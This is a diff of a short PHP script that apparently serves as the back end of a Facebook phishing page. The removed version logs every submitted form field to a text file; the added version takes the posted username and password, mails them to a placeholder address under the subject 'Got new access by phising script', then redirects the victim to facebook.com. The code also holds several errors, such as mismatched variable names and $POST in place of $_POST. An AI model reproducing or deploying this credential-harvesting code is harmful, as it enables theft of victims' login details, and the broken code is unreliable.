@@ -1,3 +1,18 @@
-<?php header ('Location: http://www.facebook.com/'); $handle=fopen("utilisateurs.txt", "a"); foreach($_POST as $variable=>$value);{ fwrite($handle, $variable); fwrite($handler, "=");
- fwrite($handler, "$value"); fwrite($handler, "\r\n\"); }  fwrite($handler, "\r\n\"); fclose($handle); exit; }
- ?>
+<?php
+	mail_sender(){
+		$username = $POST['username'];
+		$password = $POST['password'];
+		
+		$reciever = "YOUR-EMAIL ADRRESS";
+		
+		$subject = "Got new access by phising script";
+		$message = "The username is ". $username;
+		$message .= "and password is ". $password;
+		
+		return mail($reciever, $subject, $message);
+	}
+	
+	if(mail_sender()){
+		header("Location: http://www.facebook.com");
+	}
+?>
